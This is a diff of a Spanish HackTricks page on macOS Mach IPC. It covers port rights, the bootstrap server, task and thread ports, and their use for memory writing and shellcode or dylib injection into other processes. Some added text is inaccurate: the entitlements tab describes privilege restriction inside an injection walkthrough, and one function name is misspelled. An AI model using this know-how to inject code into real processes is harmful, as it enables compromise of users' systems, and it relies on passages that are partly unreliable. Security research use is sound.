@@ -7,7 +7,7 @@
 Otras formas de apoyar a HackTricks:
 
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
@@ -22,28 +22,28 @@ Mach utiliza **tareas** como la **unidad más pequeña** para compartir recursos
 
 La comunicación entre tareas ocurre a través de la Comunicación entre Procesos de Mach (IPC), utilizando canales de comunicación unidireccionales. **Los mensajes se transfieren entre puertos**, que actúan como **colas de mensajes** gestionadas por el kernel.
 
-Un **puerto** es el **elemento básico** de la IPC de Mach. Puede ser utilizado para **enviar mensajes y recibirlos**.
+Un **puerto** es el **elemento básico** de la IPC de Mach. Se puede utilizar para **enviar mensajes y recibirlos**.
 
-Cada proceso tiene una **tabla IPC**, donde es posible encontrar los **puertos de Mach del proceso**. El nombre de un puerto de Mach es en realidad un número (un puntero al objeto del kernel).
+Cada proceso tiene una **tabla de IPC**, donde es posible encontrar los **puertos de Mach del proceso**. El nombre de un puerto de Mach es en realidad un número (un puntero al objeto del kernel).
 
-Un proceso también puede enviar un nombre de puerto con algunos derechos **a una tarea diferente** y el kernel hará que esta entrada en la **tabla IPC de la otra tarea** aparezca.
+Un proceso también puede enviar un nombre de puerto con algunos derechos **a una tarea diferente** y el kernel creará esta entrada en la **tabla de IPC de la otra tarea**.
 
 ### Derechos de Puerto
 
 Los derechos de puerto, que definen qué operaciones puede realizar una tarea, son clave en esta comunicación. Los posibles **derechos de puerto** son ([definiciones desde aquí](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
 
-* **Derecho de Recepción**, que permite recibir mensajes enviados al puerto. Los puertos de Mach son colas MPSC (múltiples productores, un solo consumidor), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de las tuberías, donde varios procesos pueden tener descriptores de archivo al extremo de lectura de una tubería).
-* Una **tarea con el Derecho de Recepción** puede recibir mensajes y **crear derechos de Envío**, lo que le permite enviar mensajes. Originalmente, solo la **propia tarea tiene el Derecho de Recepción sobre su puerto**.
+* **Derecho de Recepción**, que permite recibir mensajes enviados al puerto. Los puertos de Mach son colas MPSC (múltiples productores, un solo consumidor), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de las tuberías, donde varios procesos pueden tener descriptores de archivo para el extremo de lectura de una tubería).
+* Una **tarea con el Derecho de Recepción** puede recibir mensajes y **crear Derechos de Envío**, lo que le permite enviar mensajes. Originalmente, solo la **propia tarea tiene el Derecho de Recepción sobre su puerto**.
 * Si el propietario del Derecho de Recepción **muere** o lo elimina, el **derecho de envío se vuelve inútil (nombre muerto).**
 * **Derecho de Envío**, que permite enviar mensajes al puerto.
-* El Derecho de Envío puede ser **clonado** para que una tarea que posee un Derecho de Envío pueda clonar el derecho y **concedérselo a una tercera tarea**.
-* Ten en cuenta que los **derechos de puerto** también pueden ser **pasados** a través de mensajes de Mac.
+* El Derecho de Envío se puede **clonar** para que una tarea que posea un Derecho de Envío pueda clonar el derecho y **concedérselo a una tercera tarea**.
+* Ten en cuenta que los **derechos de puerto** también se pueden **pasar** a través de mensajes de Mac.
 * **Derecho de Envío-una-vez**, que permite enviar un mensaje al puerto y luego desaparece.
-* Este derecho **no** puede ser **clonado**, pero puede ser **movido**.
+* Este derecho **no** se puede **clonar**, pero se puede **mover**.
 * **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden utilizar para escuchar en varios puertos simultáneamente, de manera similar a `select`/`poll`/`epoll`/`kqueue` en Unix.
 * **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando se destruye un puerto, todos los derechos de puerto existentes para el puerto se convierten en nombres muertos.
 
-**Las tareas pueden transferir DERECHOS DE ENVÍO a otros**, lo que les permite enviar mensajes de vuelta. **Los DERECHOS DE ENVÍO también pueden ser clonados, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea**. Esto, combinado con un proceso intermedio conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.
+**Las tareas pueden transferir DERECHOS DE ENVÍO a otros**, lo que les permite enviar mensajes de vuelta. **Los DERECHOS DE ENVÍO también se pueden clonar, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea**. Esto, combinado con un proceso intermedio conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.
 
 ### Puertos de Archivo
 
@@ -60,16 +60,16 @@ Para esto, el **servidor de arranque** (**launchd** en Mac) está involucrado, y
 3. La tarea **A** establece una **conexión** con el **servidor de arranque**, y **le envía el DERECHO DE ENVÍO** para el puerto que generó al principio.
 * Recuerda que cualquiera puede obtener un DERECHO DE ENVÍO al servidor de arranque.
 4. La tarea A envía un mensaje `bootstrap_register` al servidor de arranque para **asociar el puerto dado con un nombre** como `com.apple.taska`.
-5. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el nombre del servicio** (`bootstrap_lookup`). Para que el servidor de arranque pueda responder, la tarea B enviará un **DERECHO DE ENVÍO a un puerto que creó previamente** dentro del mensaje de búsqueda. Si la búsqueda tiene éxito, el **servidor duplicará el DERECHO DE ENVÍO** recibido de la tarea A y **lo transmitirá a la tarea B**.
+5. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el nombre del servicio** (`bootstrap_lookup`). Para que el servidor de arranque pueda responder, la tarea B le enviará un **DERECHO DE ENVÍO a un puerto que creó previamente** dentro del mensaje de búsqueda. Si la búsqueda tiene éxito, el **servidor duplica el DERECHO DE ENVÍO** recibido de la tarea A y **lo transmite a la tarea B**.
 * Recuerda que cualquiera puede obtener un DERECHO DE ENVÍO al servidor de arranque.
 6. Con este DERECHO DE ENVÍO, la **tarea B** es capaz de **enviar** un **mensaje** **a la tarea A**.
 7. Para una comunicación bidireccional, por lo general la tarea **B** genera un nuevo puerto con un **derecho de RECEPCIÓN** y un **derecho de ENVÍO**, y le da el **derecho de ENVÍO a la tarea A** para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).
 
-El servidor de arranque **no puede autenticar** el nombre de servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **hacerse pasar por cualquier tarea del sistema**, como **falsamente reclamar un nombre de servicio de autorización** y luego aprobar cada solicitud.
+El servidor de arranque **no puede autenticar** el nombre de servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **hacerse pasar por cualquier tarea del sistema**, como reclamar falsamente un nombre de servicio de autorización y luego aprobar cada solicitud.
 
 Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios protegidos por SIP: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se almacena el **binario asociado**. El servidor de arranque, creará y mantendrá un **derecho de RECEPCIÓN para cada uno de estos nombres de servicio**.
 
-Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia dinámicamente el servicio. El nuevo flujo de trabajo es el siguiente:
+Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia el servicio dinámicamente. El nuevo flujo de trabajo es el siguiente:
 
 * La tarea **B** inicia una **búsqueda de arranque** para un nombre de servicio.
 * **launchd** verifica si la tarea se está ejecutando y si no lo está, la **inicia**.
@@ -77,7 +77,7 @@ Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente
 * launchd duplica el **DERECHO DE ENVÍO y lo envía a la tarea B**.
 * La tarea **B** genera un nuevo puerto con un **derecho de RECEPCIÓN** y un **derecho de ENVÍO**, y le da el **derecho de ENVÍO a la tarea A** (el servicio) para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).
 
-Sin embargo, este proceso solo se aplica a las tareas del sistema predefinidas. Las tareas no del sistema aún operan como se describió originalmente, lo que podría permitir potencialmente la suplantación.
+Sin embargo, este proceso solo se aplica a tareas del sistema predefinidas. Las tareas no del sistema aún operan como se describió originalmente, lo que podría permitir potencialmente la suplantación.
 
 {% hint style="danger" %}
 Por lo tanto, launchd nunca debería fallar o todo el sistema fallará.
@@ -97,7 +97,7 @@ mach_port_name_t              msgh_voucher_port;
 mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
-Los procesos que poseen un _**derecho de recepción**_ pueden recibir mensajes en un puerto Mach. Por otro lado, los **emisores** reciben un _**derecho de envío**_ o un _**derecho de envío único**_. El derecho de envío único es exclusivamente para enviar un único mensaje, después de lo cual se vuelve inválido.
+Los procesos que poseen un _**derecho de recepción**_ pueden recibir mensajes en un puerto Mach. Por otro lado, los **emisores** tienen un _**derecho de envío**_ o un _**derecho de envío único**_. El derecho de envío único es exclusivamente para enviar un único mensaje, después de lo cual se vuelve inválido.
 
 El campo inicial **`msgh_bits`** es un mapa de bits:
 
@@ -120,7 +120,7 @@ Los tipos que se pueden especificar en el vale, puertos locales y remotos son (d
 #define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
 #define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
 ```
-Por ejemplo, `MACH_MSG_TYPE_MAKE_SEND_ONCE` se puede usar para **indicar** que un **derecho de envío único** debe ser derivado y transferido para este puerto. También se puede especificar `MACH_PORT_NULL` para evitar que el destinatario pueda responder.
+Por ejemplo, `MACH_MSG_TYPE_MAKE_SEND_ONCE` se puede usar para **indicar** que un **derecho** de **envío único** debe ser derivado y transferido para este puerto. También se puede especificar `MACH_PORT_NULL` para evitar que el destinatario pueda responder.
 
 Para lograr una **comunicación bidireccional** fácil, un proceso puede especificar un **puerto mach** en el **encabezado del mensaje mach** llamado el _puerto de respuesta_ (**`msgh_local_port`**) donde el **receptor** del mensaje puede **enviar una respuesta** a este mensaje.
 
@@ -139,9 +139,9 @@ Los otros campos del encabezado del mensaje son:
 Tenga en cuenta que los **mensajes mach se envían a través de un `puerto mach`**, que es un canal de comunicación de **un solo receptor**, **múltiples emisores** integrado en el núcleo mach. **Múltiples procesos** pueden **enviar mensajes** a un puerto mach, pero en cualquier momento solo **un proceso puede leer** de él.
 {% endhint %}
 
-Los mensajes luego se forman por el encabezado **`mach_msg_header_t`** seguido del **cuerpo** y por el **trailer** (si lo hay) y puede otorgar permiso para responder. En estos casos, el kernel solo necesita pasar el mensaje de una tarea a la otra.
+Los mensajes se forman con el encabezado **`mach_msg_header_t`** seguido del **cuerpo** y del **trailer** (si lo hay) y puede otorgar permiso para responder. En estos casos, el kernel solo necesita pasar el mensaje de una tarea a la otra.
 
-Un **trailer** es **información agregada al mensaje por el kernel** (no puede ser establecida por el usuario) que puede ser solicitada en la recepción del mensaje con las banderas `MACH_RCV_TRAILER_<trailer_opt>` (hay diferentes informaciones que se pueden solicitar).
+Un **trailer** es **información añadida al mensaje por el kernel** (no puede ser establecida por el usuario) que puede ser solicitada en la recepción del mensaje con las banderas `MACH_RCV_TRAILER_<trailer_opt>` (hay diferentes informaciones que se pueden solicitar).
 
 #### Mensajes Complejos
 
@@ -164,7 +164,7 @@ unsigned int                  pad3 : 24;
 mach_msg_descriptor_type_t    type : 8;
 } mach_msg_type_descriptor_t;
 ```
-En 32 bits, todos los descriptores son de 12 bytes y el tipo de descriptor está en el onceavo. En 64 bits, los tamaños varían.
+En 32 bits, todos los descriptores son de 12B y el tipo de descriptor está en el 11º. En 64 bits, los tamaños varían.
 
 {% hint style="danger" %}
 El kernel copiará los descriptores de una tarea a la otra, pero primero **creando una copia en la memoria del kernel**. Esta técnica, conocida como "Feng Shui", ha sido abusada en varios exploits para hacer que el **kernel copie datos en su memoria** haciendo que un proceso envíe descriptores a sí mismo. Luego, el proceso puede recibir los mensajes (el kernel los liberará).
@@ -181,7 +181,7 @@ Tenga en cuenta que los puertos están asociados al espacio de nombres de la tar
 * `mach_port_allocate_name`: Cambiar el nombre del puerto (por defecto un entero de 32 bits)
 * `mach_port_names`: Obtener nombres de puerto de un objetivo
 * `mach_port_type`: Obtener derechos de una tarea sobre un nombre
-* `mach_port_rename`: Renombrar un puerto (como dup2 para descriptores de archivo)
+* `mach_port_rename`: Renombrar un puerto (como dup2 para los descriptores de archivo)
 * `mach_port_allocate`: Asignar un nuevo RECEIVE, PORT\_SET o DEAD\_NAME
 * `mach_port_insert_right`: Crear un nuevo derecho en un puerto donde tienes RECEIVE
 * `mach_port_...`
@@ -285,7 +285,7 @@ name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  q
 [...]
 ```
 El **nombre** es el nombre predeterminado dado al puerto (ver cómo está **aumentando** en los primeros 3 bytes). El **`ipc-object`** es el **identificador** único **obfuscado** del puerto.\
-También observe cómo los puertos con solo el derecho de **`send`** están **identificando al propietario** de este (nombre del puerto + pid).\
+También observe cómo los puertos con solo el derecho de **`enviar`** están **identificando al propietario** de este (nombre del puerto + pid).\
 También observe el uso de **`+`** para indicar **otras tareas conectadas al mismo puerto**.
 
 También es posible usar [**procesxp**](https://www.newosxbook.com/tools/procexp.html) para ver también los **nombres de servicio registrados** (con SIP deshabilitado debido a la necesidad de `com.apple.system-task-port`):
@@ -367,24 +367,7 @@ printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 ```
 {% endtab %}
 
-{% tab title="sender.c" %} 
-
-### Descripción
-
-El archivo `sender.c` contiene el código fuente de un programa que envía mensajes a un receptor a través de IPC en macOS.
-
-### Uso
-
-Compile el programa utilizando un compilador de C y ejecútelo en conjunto con el receptor para establecer la comunicación entre procesos.
-
-### Ejemplo
-
-```bash
-gcc sender.c -o sender
-./sender
-```
-
-{% endtab %}
+{% tab title="sender.c" %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -441,24 +424,24 @@ printf("Sent a message\n");
 
 ## Puertos privilegiados
 
-Existen algunos puertos especiales que permiten **realizar ciertas acciones sensibles o acceder a ciertos datos sensibles** en caso de que una tarea tenga permisos de **ENVÍO** sobre ellos. Esto hace que estos puertos sean muy interesantes desde la perspectiva de un atacante no solo por las capacidades, sino porque es posible **compartir permisos de ENVÍO entre tareas**.
+Existen algunos puertos especiales que permiten **realizar ciertas acciones sensibles o acceder a ciertos datos sensibles** en caso de que una tarea tenga permisos de **SEND** sobre ellos. Esto hace que estos puertos sean muy interesantes desde la perspectiva de un atacante no solo por las capacidades, sino también porque es posible **compartir permisos SEND entre tareas**.
 
 ### Puertos especiales del host
 
 Estos puertos están representados por un número.
 
-Los derechos de **ENVÍO** se pueden obtener llamando a **`host_get_special_port`** y los derechos de **RECIBIR** llamando a **`host_set_special_port`**. Sin embargo, ambas llamadas requieren el puerto **`host_priv`** al que solo puede acceder el usuario root. Además, en el pasado, el usuario root podía llamar a **`host_set_special_port`** y secuestrar arbitrariamente lo que permitía, por ejemplo, eludir las firmas de código secuestrando `HOST_KEXTD_PORT` (SIP ahora lo previene).
+Los derechos de **SEND** se pueden obtener llamando a **`host_get_special_port`** y los derechos de **RECEIVE** llamando a **`host_set_special_port`**. Sin embargo, ambas llamadas requieren el puerto **`host_priv`** al que solo puede acceder el usuario root. Además, en el pasado, el usuario root podía llamar a **`host_set_special_port`** y secuestrar arbitrariamente lo que permitía, por ejemplo, eludir las firmas de código secuestrando `HOST_KEXTD_PORT` (SIP ahora lo previene).
 
 Estos se dividen en 2 grupos: Los **primeros 7 puertos son propiedad del kernel** siendo el 1 `HOST_PORT`, el 2 `HOST_PRIV_PORT`, el 3 `HOST_IO_MASTER_PORT` y el 7 es `HOST_MAX_SPECIAL_KERNEL_PORT`.\
-Los que comienzan **desde** el número **8** son **propiedad de demonios del sistema** y se pueden encontrar declarados en [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).
+Los que comienzan **desde** el número **8** son **propiedad de los demonios del sistema** y se pueden encontrar declarados en [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).
 
-* **Puerto del host**: Si un proceso tiene **privilegio de ENVÍO** sobre este puerto, puede obtener **información** sobre el **sistema** llamando a sus rutinas como:
+* **Puerto del host**: Si un proceso tiene privilegios de **SEND** sobre este puerto, puede obtener **información** sobre el **sistema** llamando a sus rutinas como:
 * `host_processor_info`: Obtener información del procesador
 * `host_info`: Obtener información del host
 * `host_virtual_physical_table_info`: Tabla de páginas virtuales/físicas (requiere MACH\_VMDEBUG)
 * `host_statistics`: Obtener estadísticas del host
 * `mach_memory_info`: Obtener diseño de memoria del kernel
-* **Puerto de privilegio del host**: Un proceso con el derecho de **ENVÍO** sobre este puerto puede realizar **acciones privilegiadas** como mostrar datos de arranque o intentar cargar una extensión de kernel. El **proceso necesita ser root** para obtener este permiso.
+* **Puerto de privilegio del host**: Un proceso con derecho de **SEND** sobre este puerto puede realizar **acciones privilegiadas** como mostrar datos de arranque o intentar cargar una extensión de kernel. El **proceso necesita ser root** para obtener este permiso.
 * Además, para llamar a la API **`kext_request`** se necesitan otros permisos **`com.apple.private.kext*`** que solo se otorgan a binarios de Apple.
 * Otras rutinas que se pueden llamar son:
 * `host_get_boot_info`: Obtener `machine_boot_info()`
@@ -466,48 +449,82 @@ Los que comienzan **desde** el número **8** son **propiedad de demonios del sis
 * `vm_allocate_cpm`: Asignar memoria física contigua
 * `host_processors`: Derecho de envío a procesadores del host
 * `mach_vm_wire`: Hacer residente la memoria
-* Como **root** puede acceder a este permiso, podría llamar a `host_set_[special/exception]_port[s]` para **secuestrar puertos especiales o de excepción del host**.
+* Como el usuario **root** puede acceder a este permiso, podría llamar a `host_set_[special/exception]_port[s]` para **secuestrar puertos especiales o de excepción del host**.
 
 Es posible **ver todos los puertos especiales del host** ejecutando:
 ```bash
 procexp all ports | grep "HSP"
 ```
-### Puertos de Tareas
+### Tarea Puertos Especiales
 
-Originalmente, Mach no tenía "procesos", tenía "tareas" que se consideraban más como contenedores de hilos. Cuando Mach se fusionó con BSD, cada tarea se correlacionó con un proceso BSD. Por lo tanto, cada proceso BSD tiene los detalles necesarios para ser un proceso y cada tarea Mach también tiene sus propias operaciones internas (excepto por el pid inexistente 0 que es el `kernel_task`).
+Estos son puertos reservados para servicios conocidos. Es posible obtener/establecerlos llamando a `task_[get/set]_special_port`. Se pueden encontrar en `task_special_ports.h`:
+```c
+typedef	int	task_special_port_t;
+
+#define TASK_KERNEL_PORT	1	/* Represents task to the outside
+world.*/
+#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
+#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
+#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
+#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
+```
+Desde [aquí](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):
+
+* **TASK\_KERNEL\_PORT**\[derecho de envío de tarea-propia]: El puerto utilizado para controlar esta tarea. Se utiliza para enviar mensajes que afectan a la tarea. Este es el puerto devuelto por **mach\_task\_self (ver Puertos de Tarea abajo)**.
+* **TASK\_BOOTSTRAP\_PORT**\[derecho de envío de arranque]: El puerto de arranque de la tarea. Se utiliza para enviar mensajes solicitando el retorno de otros puertos de servicios del sistema.
+* **TASK\_HOST\_NAME\_PORT**\[derecho de envío de host-propio]: El puerto utilizado para solicitar información del host que contiene. Este es el puerto devuelto por **mach\_host\_self**.
+* **TASK\_WIRED\_LEDGER\_PORT**\[derecho de envío de libro mayor]: El puerto que nombra la fuente de la cual esta tarea extrae su memoria cableada del kernel.
+* **TASK\_PAGED\_LEDGER\_PORT**\[derecho de envío de libro mayor]: El puerto que nombra la fuente de la cual esta tarea extrae su memoria gestionada por defecto.
+
+### Puertos de Tarea
+
+Originalmente, Mach no tenía "procesos", tenía "tareas" que se consideraban más como contenedores de hilos. Cuando Mach se fusionó con BSD, **cada tarea se correlacionó con un proceso BSD**. Por lo tanto, cada proceso BSD tiene los detalles que necesita para ser un proceso y cada tarea Mach también tiene sus funcionamientos internos (excepto por el pid inexistente 0 que es el `kernel_task`).
 
 Hay dos funciones muy interesantes relacionadas con esto:
 
-- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtiene un derecho de ENVÍO para el puerto de la tarea relacionada con el especificado por el `pid` y se lo da al `target_task_port` indicado (que suele ser la tarea del llamante que ha utilizado `mach_task_self()`, pero podría ser un puerto de ENVÍO sobre una tarea diferente).
-- `pid_for_task(task, &pid)`: Dado un derecho de ENVÍO a una tarea, encuentra a qué PID está relacionada esta tarea.
+* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtener un derecho de ENVÍO para el puerto de tarea de la tarea relacionada con el especificado por el `pid` y dárselo al `target_task_port` indicado (que suele ser la tarea del llamante que ha utilizado `mach_task_self()`, pero podría ser un puerto de ENVÍO sobre una tarea diferente).
+* `pid_for_task(task, &pid)`: Dado un derecho de ENVÍO a una tarea, encontrar a qué PID está relacionada esta tarea.
 
-Para realizar acciones dentro de la tarea, la tarea necesitaba un derecho de `ENVÍO` a sí misma llamando a `mach_task_self()` (que utiliza el `task_self_trap` (28)). Con este permiso, una tarea puede realizar varias acciones como:
+Para realizar acciones dentro de la tarea, la tarea necesitaba un derecho de `ENVÍO` a sí misma llamando a `mach_task_self()` (que utiliza la `task_self_trap` (28)). Con este permiso, una tarea puede realizar varias acciones como:
 
-- `task_threads`: Obtener un derecho de ENVÍO sobre todos los puertos de tarea de los hilos de la tarea.
-- `task_info`: Obtener información sobre una tarea.
-- `task_suspend/resume`: Suspender o reanudar una tarea.
-- `task_[get/set]_special_port`
-- `thread_create`: Crear un hilo.
-- `task_[get/set]_state`: Controlar el estado de la tarea.
-- y más se puede encontrar en [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)
+* `task_threads`: Obtener derecho de ENVÍO sobre todos los puertos de tarea de los hilos de la tarea
+* `task_info`: Obtener información sobre una tarea
+* `task_suspend/resume`: Suspender o reanudar una tarea
+* `task_[get/set]_special_port`
+* `thread_create`: Crear un hilo
+* `task_[get/set]_state`: Controlar el estado de la tarea
+* y más se puede encontrar en [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)
 
 {% hint style="danger" %}
 Ten en cuenta que con un derecho de ENVÍO sobre un puerto de tarea de una **tarea diferente**, es posible realizar tales acciones sobre una tarea diferente.
 {% endhint %}
 
-Además, el `task_port` es también el puerto **`vm_map`** que permite **leer y manipular memoria** dentro de una tarea con funciones como `vm_read()` y `vm_write()`. Básicamente, esto significa que una tarea con derechos de ENVÍO sobre el `task_port` de una tarea diferente podrá **inyectar código en esa tarea**.
+Además, el puerto de la tarea es también el puerto **`vm_map`** que permite **leer y manipular memoria** dentro de una tarea con funciones como `vm_read()` y `vm_write()`. Básicamente, esto significa que una tarea con derechos de ENVÍO sobre el puerto de tarea de una tarea diferente podrá **inyectar código en esa tarea**.
 
-Recuerda que debido a que el **kernel también es una tarea**, si alguien logra obtener **permisos de ENVÍO** sobre el **`kernel_task`**, podrá hacer que el kernel ejecute cualquier cosa (jailbreaks).
+Recuerda que debido a que el **kernel también es una tarea**, si alguien logra obtener permisos de **ENVÍO** sobre el **`kernel_task`**, podrá hacer que el kernel ejecute cualquier cosa (jailbreaks).
 
-- Llama a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea del llamante. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()` en un binario suid). La única forma de generar una tarea y obtener su puerto es realizar la ["danza de intercambio de puertos"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mientras se hace un `fork()`.
-- Estas son las restricciones para acceder al puerto (desde `macos_task_policy` del binario `AppleMobileFileIntegrity`):
-  - Si la aplicación tiene el **permiso com.apple.security.get-task-allow**, los procesos del **mismo usuario pueden acceder al puerto de la tarea** (comúnmente añadido por Xcode para depurar). El proceso de **notarización** no lo permitirá en versiones de producción.
-  - Las aplicaciones con el permiso **`com.apple.system-task-ports`** pueden obtener el **puerto de tarea de cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a aplicaciones de Apple.
-  - **Root puede acceder a los puertos de tarea** de aplicaciones **no** compiladas con un tiempo de ejecución **fortificado** (y no de Apple).
+* Llama a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea del llamante. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()` en un binario suid). La única forma de generar una tarea y obtener su puerto es realizar la ["danza de intercambio de puertos"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mientras se hace un `fork()`.
+* Estas son las restricciones para acceder al puerto (de `macos_task_policy` del binario `AppleMobileFileIntegrity`):
+* Si la aplicación tiene el **permiso com.apple.security.get-task-allow**, los procesos del **mismo usuario pueden acceder al puerto de la tarea** (comúnmente añadido por Xcode para depuración). El proceso de **notarización** no permitirá que se incluya en lanzamientos de producción.
+* Las aplicaciones con el permiso **`com.apple.system-task-ports`** pueden obtener el **puerto de tarea de cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a aplicaciones de Apple.
+* **Root puede acceder a los puertos de tarea** de aplicaciones **no** compiladas con un tiempo de ejecución **fortificado** (y no de Apple).
 
 **El puerto de nombre de tarea:** Una versión no privilegiada del _puerto de tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.
 
-### Inyección de Shellcode en hilo a través del puerto de tarea
+### Puertos de Hilo
+
+Los hilos también tienen puertos asociados, que son visibles desde la tarea que llama a **`task_threads`** y desde el procesador con `processor_set_threads`. Un derecho de ENVÍO al puerto del hilo permite utilizar la función del subsistema `thread_act`, como:
+
+* `thread_terminate`
+* `thread_[get/set]_state`
+* `act_[get/set]_state`
+* `thread_[suspend/resume]`
+* `thread_info`
+* ...
+
+Cualquier hilo puede obtener este puerto llamando a **`mach_thread_sef`**.
+
+### Inyección de Shellcode en hilo a través del puerto de Tarea
 
 Puedes obtener un shellcode desde:
 
@@ -552,9 +569,13 @@ return 0;
 
 ### entitlements.plist
 
-El archivo `entitlements.plist` contiene información sobre los permisos y capacidades que una aplicación tiene en macOS. Estos permisos pueden ser abusados para realizar escaladas de privilegios y llevar a cabo ataques de intercomunicación entre procesos (IPC). 
+El archivo `entitlements.plist` contiene información sobre los privilegios y capacidades que una aplicación tiene en macOS. Es crucial revisar y modificar este archivo para limitar los privilegios de una aplicación y mejorar la seguridad del sistema. 
 
-Para protegerse contra este tipo de abusos, es importante revisar y limitar cuidadosamente los permisos otorgados a las aplicaciones en el archivo `entitlements.plist`.
+Aquí se pueden definir qué recursos puede acceder una aplicación, como la cámara, el micrófono, la red, entre otros. Al restringir adecuadamente estos privilegios, se puede reducir la superficie de ataque y prevenir posibles abusos de procesos en macOS. 
+
+Es importante revisar y ajustar los permisos en `entitlements.plist` para garantizar la seguridad y privacidad de las aplicaciones en macOS. 
+
+{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -567,7 +588,7 @@ Para protegerse contra este tipo de abusos, es importante revisar y limitar cuid
 {% endtab %}
 {% endtabs %}
 
-**Compila** el programa anterior y agrega los **permisos** necesarios para poder inyectar código con el mismo usuario (de lo contrario, necesitarás usar **sudo**).
+**Compila** el programa anterior y agrega los **permisos especiales** para poder inyectar código con el mismo usuario (de lo contrario necesitarás usar **sudo**).
 
 <details>
 
@@ -782,11 +803,11 @@ Para que esto funcione en iOS, necesitas el entitlement `dynamic-codesigning` pa
 
 ### Inyección de Dylib en hilo a través del puerto de tarea
 
-En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la **API posix `pthread`**. El hilo que generamos en la inyección anterior fue generado utilizando la API de Mach, por lo que **no es compatible con posix**.
+En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la **API posix `pthread`**. El hilo que generamos en la inyección anterior, fue generado utilizando la API Mach, por lo que **no es compatible con posix**.
 
 Fue posible **inyectar un shellcode simple** para ejecutar un comando porque **no era necesario trabajar con APIs compatibles con posix**, solo con Mach. Las **inyecciones más complejas** necesitarían que el **hilo** también sea **compatible con posix**.
 
